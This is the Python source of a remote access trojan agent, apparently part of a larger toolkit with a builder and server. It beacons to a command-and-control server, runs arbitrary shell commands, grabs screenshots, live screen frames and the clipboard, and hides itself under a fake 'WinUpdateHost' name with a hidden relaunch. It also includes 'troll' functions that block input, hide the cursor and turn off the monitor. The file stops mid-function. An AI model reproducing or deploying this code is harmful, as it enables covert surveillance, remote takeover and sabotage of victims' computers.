#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAF agent -- single-file reverse access agent.

Deploy with builder.py, or edit HOST / PORT / KEY below by hand and run it.
Connects back to server.py, executes commands, transfers files, captures the
screen, logs keystrokes and installs persistence.

stdlib only. Windows-first; shell / file ops degrade gracefully on POSIX.
"""

import base64
import csv
import ctypes
import hashlib
import hmac
import io
import json
import locale
import os
import platform
import random
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time

# --------------------------------------------------------------- configuration
HOST = "127.0.0.1"
PORT = 4444
KEY = "r4f-0000000000000000000000000000"          # must match server --key
RECONNECT_MIN = 1
RECONNECT_MAX = 8
STEALTH = False        # builder --stealth flips this on: hidden relaunch + mutex
TRANSPORT = "tcp"      # "http" polls <HTTP_BASE>/c2/poll -- works through any tunnel
HTTP_BASE = ""
BOOTSTRAP = ""         # rendezvous channel: live C2 url is read from here on every sync
AGENT_VER = "3.1"      # muda a cada build: o painel mostra isso em "versao"
# ------------------------------------------------------------------------------

IS_WIN = os.name == "nt"
_KEY = KEY.encode() if isinstance(KEY, str) else KEY

_FRAME = struct.Struct(">I")
_NONCE = 8
_TAG = 16
_MAX_FRAME = 96 * 1024 * 1024
_CHUNK = 48 * 1024

STATE = {"cwd": os.getcwd(), "sleep": 0}
_KEYLOG = {"inst": None}


# ------------------------------------------------------------------- transport
def _keystream(key, nonce, n):
    out = bytearray()
    ctr = 0
    while len(out) < n:
        out += hashlib.sha256(key + nonce + ctr.to_bytes(4, "big")).digest()
        ctr += 1
    return bytes(out[:n])


def _seal(key, plain):
    nonce = os.urandom(_NONCE)
    ct = bytes(a ^ b for a, b in zip(plain, _keystream(key, nonce, len(plain))))
    tag = hmac.new(key, nonce + ct, hashlib.sha256).digest()[:_TAG]
    return nonce + ct + tag


def _open(key, blob):
    if len(blob) < _NONCE + _TAG:
        raise ValueError("short frame")
    nonce, ct, tag = blob[:_NONCE], blob[_NONCE:-_TAG], blob[-_TAG:]
    want = hmac.new(key, nonce + ct, hashlib.sha256).digest()[:_TAG]
    if not hmac.compare_digest(tag, want):
        raise ValueError("authentication failed")
    return bytes(a ^ b for a, b in zip(ct, _keystream(key, nonce, len(ct))))


def send(sock, obj, key=None):
    blob = _seal(key or _KEY, json.dumps(obj, separators=(",", ":")).encode())
    sock.sendall(_FRAME.pack(len(blob)) + blob)


def _recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        part = sock.recv(n - len(buf))
        if not part:
            raise ConnectionError("peer closed")
        buf += part
    return bytes(buf)


def recv(sock, key=None):
    (n,) = _FRAME.unpack(_recv_exact(sock, 4))
    if n <= 0 or n > _MAX_FRAME:
        raise ValueError("bad frame size %d" % n)
    return json.loads(_open(key or _KEY, _recv_exact(sock, n)).decode())


# ------------------------------------------------------------- http transport
class _MemSock:
    """Stand-in for a socket so dispatch() works unchanged over HTTP."""

    def __init__(self):
        self.out = []
        self.buf = b""

    def sendall(self, blob):
        (n,) = _FRAME.unpack(blob[:4])
        self.out.append(blob[4:4 + n])

    def recv(self, n):
        while not self.buf:
            raise ConnectionError("no inbound data")
        part, self.buf = self.buf[:n], self.buf[n:]
        return part

    def close(self):
        pass


_CONN = {"c": None}


def _close_conn():
    c = _CONN.get("c")
    _CONN["c"] = None
    if c is not None:
        try:
            c.close()
        except Exception:
            pass


def _post(url, obj, timeout=12):
    """POST reaproveitando a conexao TLS.

    Um handshake novo por poll custava ~1s e, na borda instavel do Render,
    estourava o timeout e travava o loop inteiro -- era o "delay" dos comandos.
    """
    import http.client
    import urllib.parse

    body = json.dumps(obj, separators=(",", ":")).encode()
    sig = hmac.new(_KEY, body, hashlib.sha256).hexdigest()
    headers = {
        "Content-Type": "application/json",
        "X-Sig": sig,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Connection": "keep-alive",
    }
    u = urllib.parse.urlsplit(url)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    last = None
    for attempt in (0, 1):
        conn = _CONN.get("c")
        try:
            if conn is None:
                cls = (http.client.HTTPSConnection if u.scheme == "https"
                       else http.client.HTTPConnection)
                conn = cls(u.hostname, u.port, timeout=timeout)
                _CONN["c"] = conn
            conn.request("POST", path, body, headers)
            resp = conn.getresponse()
            raw = resp.read().decode("utf-8", "replace")
            if resp.will_close:
                _close_conn()
            return json.loads(raw) if raw.strip() else {}
        except Exception as exc:
            last = exc
            _close_conn()
            if attempt:
                raise
    raise last


def _bootstrap_base(url, timeout=20):
    """Read the live C2 endpoint from the rendezvous channel (last message wins)."""
    import urllib.request
    try:
        req = urllib.request.Request(
            url.rstrip("/") + "/json?poll=1&since=all",
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
    except Exception:
        return ""
    best = ""
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            m = json.loads(line)
        except Exception:
            continue
        if m.get("event") != "message":
            continue
        try:
            cfg = json.loads(m.get("message") or "{}")
        except Exception:
            continue
        b = (cfg.get("base") or "").strip().rstrip("/")
        if b.startswith("http"):
            best = b
    return best


def _stable_sid():
    """Id fixo por maquina, guardado em sid.txt.

    O arquivo permite trocar a sessao (fila limpa no servidor) sem rebuild:
    basta escrever outro valor de 8 hex e reiniciar o agente.
    """
    path = os.path.join(INSTALL_DIR, "sid.txt")
    try:
        with open(path, encoding="utf-8") as f:
            s = f.read().strip()
        if len(s) == 8 and all(ch in "0123456789abcdef" for ch in s.lower()):
            return s
    except OSError:
        pass
    seed = "%s|%s" % (socket.gethostname(), os.environ.get("USERNAME", ""))
    s = hashlib.sha256(seed.encode("utf-8", "replace")).hexdigest()[:8]
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(s)
    except OSError:
        pass
    return s


def http_loop(base):
    base = (base or "").rstrip("/")
    sid = _stable_sid()
    info = sysinfo()
    delay = RECONNECT_MIN
    fails = 0
    synced = 0.0
    while True:
        if BOOTSTRAP:
            stale = (not base) or fails >= 5 or (time.time() - synced) > 900
            if stale:
                got = _bootstrap_base(BOOTSTRAP, timeout=6)
                synced = time.time()
                if got and got != base:
                    base = got
                    fails = 0
                    delay = RECONNECT_MIN
        if not base:
            time.sleep(max(delay, 5))
            delay = min(delay * 2, RECONNECT_MAX)
            fails += 1
            continue
        try:
            # o servidor faz long-poll de 20s: o timeout do cliente tem de ser maior
            j = _post(base + "/c2/poll", {"sid": sid, "info": info}, timeout=30)
            delay = RECONNECT_MIN
            fails = 0
            cmds = j.get("cmds") or []
            if not cmds:
                time.sleep(0.25)
                continue
            for c in cmds:
                ms = _MemSock()
                rid = c.get("id")
                try:
                    dispatch(ms, rid, c.get("op"), c.get("args") or {})
                except SystemExit:
                    raise
                except Exception as exc:
                    send(ms, {"t": "result", "id": rid, "ok": False, "out": "[!] %s" % exc})
                msgs = []
                for blob in ms.out:
                    try:
                        msgs.append(json.loads(_open(_KEY, blob).decode()))
                    except Exception:
                        pass
                if msgs:
                    _post(base + "/c2/result", {"sid": sid, "id": rid, "msgs": msgs})
        except SystemExit:
            raise
        except Exception:
            fails += 1
            time.sleep(delay + random.uniform(0, delay * 0.3))
            delay = min(delay * 2, RECONNECT_MAX)


# --------------------------------------------------------------- host utilities
def is_admin():
    if not IS_WIN:
        return False
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _console_encodings():
    """Candidate codecs for target output, most specific first."""
    encs = ["utf-8"]
    if IS_WIN:
        try:
            k = ctypes.windll.kernel32
            for cp in (k.GetOEMCP(), k.GetACP()):
                name = "cp%d" % cp
                if name not in encs:
                    encs.append(name)
        except Exception:
            pass
        for extra in ("cp850", "cp1252"):
            if extra not in encs:
                encs.append(extra)
    else:
        try:
            name = locale.getpreferredencoding(False)
            if name and name not in encs:
                encs.append(name)
        except Exception:
            pass
    encs.append("latin-1")
    return encs


_ENCODINGS = _console_encodings()


def _decode(data):
    """Decode target output: UTF-8 first, then the console codepage (OEM/ANSI)."""
    if not data:
        return ""
    for enc in _ENCODINGS:
        try:
            return data.decode(enc)
        except (UnicodeDecodeError, LookupError):
            continue
    return data.decode("latin-1", "replace")


def _clean(text):
    """Normalise line endings so the console does not double-space output."""
    return text.replace("\r\n", "\n").replace("\r", "")


def sysinfo():
    return {
        "host": socket.gethostname(),
        "user": os.environ.get("USERNAME") or os.environ.get("USER") or "?",
        "os": "%s %s" % (platform.system(), platform.release()),
        "build": platform.version(),
        "arch": platform.machine(),
        "pid": os.getpid(),
        "cwd": STATE["cwd"],
        "python": platform.python_version(),
        "admin": is_admin(),
        "ip": _local_ip(),
    }


def _local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "?"


def run_shell(cmd, timeout=180):
    if not cmd:
        return "(empty command)"
    try:
        p = subprocess.run(
            cmd, shell=True, cwd=STATE["cwd"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=timeout,
        )
        text = _clean(_decode(p.stdout)).rstrip()
        return text if text else "(no output)"
    except subprocess.TimeoutExpired:
        return "[!] timeout after %ss" % timeout
    except Exception as exc:
        return "[!] %s" % exc


def process_list():
    """Full process table with untruncated image names."""
    if not IS_WIN:
        return run_shell("ps aux")
    try:
        p = subprocess.run("tasklist /fo csv /nh", shell=True,
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=60)
        text = _clean(_decode(p.stdout))
        rows = []
        for line in text.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                parts = next(csv.reader(io.StringIO(line)))
            except Exception:
                continue
            if len(parts) >= 5:
                rows.append(parts[:5])
        if not rows:
            return text or "(no processes)"
        head = ("IMAGE", "PID", "SESSION", "SESSION#", "MEMORY")
        widths = [max(len(head[i]), max(len(r[i]) for r in rows)) for i in range(5)]
        fmt = "  ".join("%%-%ds" % w for w in widths)
        out = [fmt % head, fmt % tuple("-" * w for w in widths)]
        out.extend(fmt % tuple(r) for r in rows)
        return "\n".join(out)
    except Exception as exc:
        return "[!] %s" % exc


def list_dir(path=None):
    path = path or STATE["cwd"]
    try:
        rows = []
        for name in sorted(os.listdir(path)):
            full = os.path.join(path, name)
            try:
                st = os.stat(full)
                kind = "d" if os.path.isdir(full) else "-"
                rows.append("%s %12d  %s" % (kind, st.st_size, name))
            except OSError:
                rows.append("- %12s  %s" % ("?", name))
        return "\n".join(rows) or "(empty)"
    except Exception as exc:
        return "[!] %s" % exc


def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


# ---------------------------------------------------------------------- stealth
def _payload_dir():
    return os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
                        "Microsoft", "WinUpdateHost")


def _pythonw():
    exe = sys.executable
    if exe.lower().endswith("python.exe"):
        cand = exe[:-10] + "pythonw.exe"
        if os.path.exists(cand):
            return cand
    return exe


def stealth_relaunch():
    """Copy to %APPDATA% and restart there through pythonw, detached, no console."""
    if not IS_WIN:
        return False
    try:
        frozen = getattr(sys, "frozen", False)
        ext = ".exe" if frozen else ".py"
        dst = os.path.join(_payload_dir(), "wuhost" + ext)
        me = os.path.abspath(sys.argv[0])
        if os.path.abspath(dst).lower() == me.lower():
            return False                       # already running from the hidden copy
        os.makedirs(_payload_dir(), exist_ok=True)
        shutil.copy2(sys.executable if frozen else me, dst)
        if frozen:
            cmd = [dst, "--host", HOST, "--port", str(PORT), "--key", _key_str()]
        else:
            cmd = [_pythonw(), dst, "--host", HOST, "--port", str(PORT), "--key", _key_str()]
        if TRANSPORT == "http" and HTTP_BASE:
            cmd += ["--http", HTTP_BASE]
        if BOOTSTRAP:
            cmd += ["--bootstrap", BOOTSTRAP]
        subprocess.Popen(
            cmd, close_fds=True,
            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=0x00000008 | 0x00000200,   # DETACHED_PROCESS | NEW_PROCESS_GROUP
        )
        return True
    except Exception:
        return False


def single_instance():
    """True when this is the only running copy (named mutex, no privileges needed)."""
    if not IS_WIN:
        return True
    try:
        k = ctypes.windll.kernel32
        k.CreateMutexW(None, False, "WinUpdateHostMutex")
        return k.GetLastError() != 183        # ERROR_ALREADY_EXISTS
    except Exception:
        return True


# -------------------------------------------------------------------- clipboard
CF_UNICODETEXT = 13
GMEM_MOVEABLE = 0x0002


def clip_get():
    if not IS_WIN:
        return "[!] clipboard requires Windows"
    u, k = ctypes.windll.user32, ctypes.windll.kernel32
    u.OpenClipboard.argtypes = [ctypes.c_void_p]
    u.GetClipboardData.argtypes = [ctypes.c_uint]
    u.GetClipboardData.restype = ctypes.c_void_p
    k.GlobalLock.argtypes = [ctypes.c_void_p]
    k.GlobalLock.restype = ctypes.c_void_p
    k.GlobalUnlock.argtypes = [ctypes.c_void_p]
    if not u.OpenClipboard(None):
        return "[!] clipboard busy"
    try:
        h = u.GetClipboardData(CF_UNICODETEXT)
        if not h:
            return "(clipboard empty)"
        p = k.GlobalLock(h)
        if not p:
            return "(clipboard empty)"
        try:
            return ctypes.wstring_at(p) or "(empty)"
        finally:
            k.GlobalUnlock(h)
    finally:
        u.CloseClipboard()


def clip_set(text):
    if not IS_WIN:
        return "[!] clipboard requires Windows"
    u, k = ctypes.windll.user32, ctypes.windll.kernel32
    u.OpenClipboard.argtypes = [ctypes.c_void_p]
    u.SetClipboardData.argtypes = [ctypes.c_uint, ctypes.c_void_p]
    u.SetClipboardData.restype = ctypes.c_void_p
    k.GlobalAlloc.argtypes = [ctypes.c_uint, ctypes.c_size_t]
    k.GlobalAlloc.restype = ctypes.c_void_p
    k.GlobalLock.argtypes = [ctypes.c_void_p]
    k.GlobalLock.restype = ctypes.c_void_p
    k.GlobalUnlock.argtypes = [ctypes.c_void_p]
    data = str(text)
    buf = ctypes.create_unicode_buffer(data)
    size = ctypes.sizeof(buf)
    if not u.OpenClipboard(None):
        return "[!] clipboard busy"
    try:
        u.EmptyClipboard()
        h = k.GlobalAlloc(GMEM_MOVEABLE, size)
        if not h:
            return "[!] GlobalAlloc failed"
        p = k.GlobalLock(h)
        if not p:
            return "[!] GlobalLock failed"
        ctypes.memmove(p, buf, size)
        k.GlobalUnlock(h)
        u.SetClipboardData(CF_UNICODETEXT, h)
    finally:
        u.CloseClipboard()
    return "clipboard set (%d chars)" % len(data)


def set_wallpaper(path):
    if not IS_WIN:
        return "[!] wallpaper requires Windows"
    if not path or not os.path.isfile(path):
        return "[!] file not found on target: %s" % path
    ok = ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, os.path.abspath(path), 3)
    return "wallpaper set" if ok else "[!] SystemParametersInfo failed"


def power(action):
    a = (action or "").lower().strip()
    if a == "lock":
        ctypes.windll.user32.LockWorkStation()
        return "workstation locked"
    flags = {"shutdown": "/s", "reboot": "/r", "logoff": "/l", "hibernate": "/h"}
    if a in flags:
        subprocess.Popen("shutdown %s /t 0" % flags[a], shell=True,
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        return "power: %s" % a
    return "[!] use: lock | reboot | shutdown | logoff | hibernate"


# ------------------------------------------------------------------- screenshot
def screenshot():
    """Grab the primary desktop into a 32-bit BMP via GDI. Returns (path, note)."""
    if not IS_WIN:
        return None, "[!] screenshot requires Windows"
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        try:
            user32.SetProcessDPIAware()
        except Exception:
            pass

        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        if w <= 0 or h <= 0:
            return None, "[!] could not read desktop geometry"

        hdc = user32.GetDC(0)
        mem = gdi32.CreateCompatibleDC(hdc)
        bmp = gdi32.CreateCompatibleBitmap(hdc, w, h)
        old = gdi32.SelectObject(mem, bmp)
        gdi32.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)  # SRCCOPY
        gdi32.SelectObject(mem, old)

        class BIH(ctypes.Structure):
            _fields_ = [
                ("biSize", ctypes.c_uint32),
                ("biWidth", ctypes.c_int32),
                ("biHeight", ctypes.c_int32),
                ("biPlanes", ctypes.c_uint16),
                ("biBitCount", ctypes.c_uint16),
                ("biCompression", ctypes.c_uint32),
                ("biSizeImage", ctypes.c_uint32),
                ("biXPelsPerMeter", ctypes.c_int32),
                ("biYPelsPerMeter", ctypes.c_int32),
                ("biClrUsed", ctypes.c_uint32),
                ("biClrImportant", ctypes.c_uint32),
            ]

        bi = BIH()
        bi.biSize = ctypes.sizeof(BIH)
        bi.biWidth = w
        bi.biHeight = -h              # top-down rows
        bi.biPlanes = 1
        bi.biBitCount = 32
        bi.biCompression = 0          # BI_RGB
        bi.biSizeImage = w * 4 * h

        buf = ctypes.create_string_buffer(bi.biSizeImage)
        got = gdi32.GetDIBits(mem, bmp, 0, h, buf, ctypes.byref(bi), 0)
        if not got:
            gdi32.DeleteObject(bmp)
            gdi32.DeleteDC(mem)
            user32.ReleaseDC(0, hdc)
            return None, "[!] GetDIBits failed"

        info = ctypes.string_at(ctypes.byref(bi), bi.biSize)
        gdi32.DeleteObject(bmp)
        gdi32.DeleteDC(mem)
        user32.ReleaseDC(0, hdc)

        path = os.path.join(tempfile.gettempdir(), "raf_scr_%d.bmp" % int(time.time() * 1000))
        with open(path, "wb") as f:
            f.write(struct.pack("<2sIHHI", b"BM", 14 + len(info) + bi.biSizeImage, 0, 0, 14 + len(info)))
            f.write(info)
            f.write(buf.raw)
        return path, "captured %dx%d" % (w, h)
    except Exception as exc:
        return None, "[!] %s" % exc


# ------------------------------------------------------- live view (JPEG/GDI+)
class _GUID(ctypes.Structure):
    _fields_ = [("Data1", ctypes.c_uint32), ("Data2", ctypes.c_uint16),
                ("Data3", ctypes.c_uint16), ("Data4", ctypes.c_ubyte * 8)]


class _CodecInfo(ctypes.Structure):
    _fields_ = [("Clsid", _GUID), ("FormatID", _GUID),
                ("CodecName", ctypes.c_wchar_p), ("DllName", ctypes.c_wchar_p),
                ("FormatDescription", ctypes.c_wchar_p),
                ("FilenameExtension", ctypes.c_wchar_p),
                ("MimeType", ctypes.c_wchar_p),
                ("Flags", ctypes.c_uint32), ("Version", ctypes.c_uint32),
                ("SigCount", ctypes.c_uint32), ("SigSize", ctypes.c_uint32),
                ("SigPattern", ctypes.c_void_p), ("SigMask", ctypes.c_void_p)]


class _StartupInput(ctypes.Structure):
    _fields_ = [("GdiplusVersion", ctypes.c_uint32),
                ("DebugEventCallback", ctypes.c_void_p),
                ("SuppressBackgroundThread", ctypes.c_int),
                ("SuppressExternalCodecs", ctypes.c_int)]


class _EncoderParameter(ctypes.Structure):
    _fields_ = [("Guid", _GUID), ("NumberOfValues", ctypes.c_uint32),
                ("Type", ctypes.c_uint32), ("Value", ctypes.c_void_p)]


class _EncoderParameters(ctypes.Structure):
    _fields_ = [("Count", ctypes.c_uint32), ("Parameter", _EncoderParameter * 1)]


_ENC_QUALITY = _GUID(0x1D5BE4B5, 0xFA4A, 0x452D,
                     (ctypes.c_ubyte * 8)(0x9C, 0xDD, 0x5D, 0xB3, 0x51, 0x05, 0xE7, 0xEB))
_GDI = {"token": None, "clsid": None}


def _gdiplus():
    """Start GDI+ once and cache the JPEG encoder CLSID."""
    g = ctypes.windll.gdiplus
    if _GDI["token"] is not None:
        return g
    inp = _StartupInput()
    inp.GdiplusVersion = 1
    token = ctypes.c_void_p()
    if g.GdiplusStartup(ctypes.byref(token), ctypes.byref(inp), None) != 0:
        raise RuntimeError("GdiplusStartup failed")
    _GDI["token"] = token

    num, size = ctypes.c_uint32(), ctypes.c_uint32()
    g.GdipGetImageEncodersSize(ctypes.byref(num), ctypes.byref(size))
    buf = ctypes.create_string_buffer(size.value)
    g.GdipGetImageEncoders(num.value, size.value, buf)
    infos = ctypes.cast(buf, ctypes.POINTER(_CodecInfo))
    for i in range(num.value):
        mime = infos[i].MimeType
        if mime and mime.lower() == "image/jpeg":
            _GDI["clsid"] = infos[i].Clsid
            break
    if _GDI["clsid"] is None:
        raise RuntimeError("no JPEG encoder available")
    return g


def _save_jpeg(hbitmap, path, quality):
    g = _gdiplus()
    g.GdipCreateBitmapFromHBITMAP.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                              ctypes.POINTER(ctypes.c_void_p)]
    g.GdipSaveImageToFile.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p,
                                      ctypes.POINTER(_GUID), ctypes.c_void_p]
    bmp = ctypes.c_void_p()
    if g.GdipCreateBitmapFromHBITMAP(ctypes.c_void_p(hbitmap), None, ctypes.byref(bmp)) != 0:
        raise RuntimeError("GdipCreateBitmapFromHBITMAP failed")
    try:
        q = ctypes.c_long(int(quality))
        ep = _EncoderParameters()
        ep.Count = 1
        ep.Parameter[0].Guid = _ENC_QUALITY
        ep.Parameter[0].NumberOfValues = 1
        ep.Parameter[0].Type = 4              # EncoderParameterValueTypeLong
        ep.Parameter[0].Value = ctypes.cast(ctypes.byref(q), ctypes.c_void_p)
        st = g.GdipSaveImageToFile(bmp, path, ctypes.byref(_GDI["clsid"]), ctypes.byref(ep))
        if st != 0:
            raise RuntimeError("GdipSaveImageToFile failed (%d)" % st)
    finally:
        g.GdipDisposeImage(bmp)


def capture_jpeg(max_width=1280, quality=55):
    """One desktop frame as JPEG, downscaled to max_width. Returns (path, note)."""
    if not IS_WIN:
        return None, "[!] frame capture requires Windows"
    hdc = mem = scaled_mem = None
    bmp = target_bmp = None
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        try:
            user32.SetProcessDPIAware()
        except Exception:
            pass

        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        if w <= 0 or h <= 0:
            return None, "[!] no desktop geometry"

        hdc = user32.GetDC(0)
        mem = gdi32.CreateCompatibleDC(hdc)
        bmp = gdi32.CreateCompatibleBitmap(hdc, w, h)
        old = gdi32.SelectObject(mem, bmp)
        gdi32.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)

        target_bmp, tw, th = bmp, w, h
        if max_width and w > int(max_width):
            tw = int(max_width)
            th = max(1, int(round(h * tw / float(w))))
            scaled_mem = gdi32.CreateCompatibleDC(hdc)
            target_bmp = gdi32.CreateCompatibleBitmap(hdc, tw, th)
            old2 = gdi32.SelectObject(scaled_mem, target_bmp)
            gdi32.SetStretchBltMode(scaled_mem, 4)      # HALFTONE
            gdi32.StretchBlt(scaled_mem, 0, 0, tw, th, mem, 0, 0, w, h, 0x00CC0020)
            gdi32.SelectObject(scaled_mem, old2)

        gdi32.SelectObject(mem, old)

        path = os.path.join(tempfile.gettempdir(), "raf_frame_%d.jpg" % int(time.time() * 1000))
        _save_jpeg(target_bmp, path, quality)
        return path, "frame %dx%d" % (tw, th)
    except Exception as exc:
        return None, "[!] %s" % exc
    finally:
        try:
            if scaled_mem:
                gdi32.DeleteObject(target_bmp)
                gdi32.DeleteDC(scaled_mem)
            if bmp:
                gdi32.DeleteObject(bmp)
            if mem:
                gdi32.DeleteDC(mem)
            if hdc:
                ctypes.windll.user32.ReleaseDC(0, hdc)
        except Exception:
            pass


# ------------------------------------------------------------- on-screen sign
_PLACA = {"close": threading.Event(), "running": False}


def show_placa(text, seconds=0, bg="#000000", fg="#ff2d2d"):
    """Fullscreen topmost sign on the target desktop. seconds=0 keeps it up."""
    if not IS_WIN:
        return "[!] overlay requires Windows"
    try:
        import tkinter as tk
    except Exception as exc:
        return "[!] tkinter unavailable: %s" % exc
    if _PLACA["running"]:
        close_placa()

    _PLACA["close"] = threading.Event()
    _PLACA["running"] = True

    def runner():
        try:
            root = tk.Tk()
            root.attributes("-fullscreen", True)
            root.attributes("-topmost", True)
            root.configure(bg=bg)
            root.overrideredirect(True)
            lbl = tk.Label(root, text=text, font=("Segoe UI", 56, "bold"),
                           fg=fg, bg=bg, wraplength=max(400, root.winfo_screenwidth() - 240),
                           justify="center")
            lbl.pack(expand=True)
            root.bind("<Escape>", lambda e: root.destroy())

            def tick():
                if _PLACA["close"].is_set():
                    try:
                        root.destroy()
                    except Exception:
                        pass
                    return
                root.after(150, tick)

            root.after(150, tick)
            if seconds and float(seconds) > 0:
                root.after(int(float(seconds) * 1000), root.destroy)
            root.mainloop()
        except Exception:
            pass
        finally:
            _PLACA["running"] = False

    threading.Thread(target=runner, daemon=True).start()
    return "placa exibida em %s" % socket.gethostname()


def close_placa():
    _PLACA["close"].set()
    return "placa fechada"


def show_msg(text, title="Aviso"):
    if not IS_WIN:
        return "[!] message box requires Windows"
    def runner():
        try:
            ctypes.windll.user32.MessageBoxW(0, str(text), str(title), 0x40)
        except Exception:
            pass
    threading.Thread(target=runner, daemon=True).start()
    return "mensagem exibida"


# ----------------------------------------------------------------------- troll
# sabotagem de desktop: cursor, mouse, teclado, bandeja, monitor, taskbar
class _POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]


class _RECT(ctypes.Structure):
    _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
                ("right", ctypes.c_long), ("bottom", ctypes.c_long)]


def _win():
    if not IS_WIN:
        raise RuntimeError("so funciona no Windows")
    return ctypes.windll.user32


def _cursor_pos():
    p = _POINT()
    _win().GetCursorPos(ctypes.byref(p))
    return p


def troll_cursor(seconds=30):
    """Esconde o cursor do alvo por N segundos e devolve no fim.

    ShowCursor so vale para a thread que chama, entao o jeito que funciona de
    verdade e trocar os cursores do sistema por um bitmap vazio e recarregar
    depois (SPI_SETCURSORS).
    """
    u = _win()
    secs = max(1, int(seconds or 30))
    u.CreateCursor.restype = ctypes.c_void_p
    u.CreateCursor.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                               ctypes.c_int, ctypes.c_int,
                               ctypes.c_char_p, ctypes.c_char_p]
    u.SetSystemCursor.argtypes = [ctypes.c_void_p, ctypes.c_uint32]
    and_mask = b"\xff" * 128          # 32x32: AND=1, XOR=0 -> nada desenhado
    xor_mask = b"\x00" * 128
    changed = 0
    for cid in (32512, 32513, 32514, 32515, 32516, 32642, 32643, 32644,
                32645, 32646, 32648, 32649, 32650, 32651):
        h = u.CreateCursor(None, 0, 0, 32, 32, and_mask, xor_mask)
        if h:
            u.SetSystemCursor(h, cid)   # a API destroi o handle
            changed += 1
    if not changed:
        return "[!] nao consegui trocar o cursor"

    def runner():
        time.sleep(secs)
        u.SystemParametersInfoW(0x0057, 0, None, 0)   # SPI_SETCURSORS
    threading.Thread(target=runner, daemon=True).start()
    return "cursor escondido por %ds" % secs


def troll_cursor_show():
    _win().SystemParametersInfoW(0x0057, 0, None, 0)
    return "cursor de volta"


def troll_lock(seconds=20):
    """Prende o mouse na posicao atual por N segundos."""
    u = _win()
    p = _cursor_pos()
    r = _RECT(p.x, p.y, p.x + 1, p.y + 1)
    u.ClipCursor(ctypes.byref(r))
    secs = max(1, int(seconds or 20))

    def runner():
        time.sleep(secs)
        u.ClipCursor(None)
    threading.Thread(target=runner, daemon=True).start()
    return "mouse travado por %ds em %d,%d" % (secs, p.x, p.y)


def troll_shake(seconds=6, radius=45):
    """Faz o cursor tremer/andar sozinho e volta ao lugar."""
    u = _win()
    p = _cursor_pos()
    secs = max(1, int(seconds or 6))

    def runner():
        end = time.time() + secs
        try:
            while time.time() < end:
                u.SetCursorPos(p.x + random.randint(-radius, radius),
                               p.y + random.randint(-radius, radius))
                time.sleep(0.03)
        finally:
            u.SetCursorPos(p.x, p.y)
    threading.Thread(target=runner, daemon=True).start()
    return "cursor tremendo por %ds" % secs


def troll_swap(enable=None):
    """Inverte os botoes do mouse (ou volta ao normal)."""
    u = _win()
    cur = bool(u.GetSystemMetrics(23))
    new = (not cur) if enable is None else bool(enable)
    u.SwapMouseButton(1 if new else 0)
    return "botoes invertidos" if new else "botoes normais"


def troll_block(seconds=10):
    """Trava teclado e mouse por N segundos (precisa de admin)."""
    u = _win()
    secs = max(1, int(seconds or 10))

    def runner():
        try:
            u.BlockInput(True)
            time.sleep(secs)
        finally:
            u.BlockInput(False)
    threading.Thread(target=runner, daemon=True).start()
    return "teclado+mouse bloqueados por %ds" % secs


def troll_tray(state="open"):
    """Abre ou fecha a bandeja do DVD/CD."""
    mci = ctypes.windll.winmm.mciSendStringW
    cmd = "set cdaudio door %s" % (
        "closed" if str(state).lower() in ("close", "closed", "fechar") else "open")
    err = mci(cmd, None, 0, None)
    if err:
        return "[!] bandeja nao respondeu (codigo %d)" % err
    return "bandeja: %s" % cmd.split()[-1]


def troll_monitor(off=True):
    """Desliga (ou religa) o monitor do alvo."""
    u = _win()
    u.SendMessageTimeoutW(0xFFFF, 0x0112, 0xF170, 2 if off else -1, 2, 5000, None)
    return "monitor desligado" if off else "monitor ligado"


def troll_beep(times=3, freq=1200):
    try:
        import winsound
    except Exception:
        return "[!] winsound indisponivel"
    for _ in range(max(1, int(times or 1))):
        try:
            winsound.Beep(int(freq), 250)
        except Exception:
            pass
        time.sleep(0.1)
    return "bipe x%d" % max(1, int(times or 1))


def troll_mute():
    """Alterna mudo/desmudo no volume do Windows."""
    u = _win()
    u.keybd_event(0xAD, 0, 0, 0)
    u.keybd_event(0xAD, 0, 2, 0)
    return "volume alternado"


def troll_taskbar(show=None):
    u = _win()
    hwnd = u.FindWindowW("Shell_TrayWnd", None)
    if not hwnd:
        return "[!] taskbar nao encontrada"
    if show is None:
        show = not bool(u.IsWindowVisible(hwnd))
    u.ShowWindow(hwnd, 5 if show else 0)
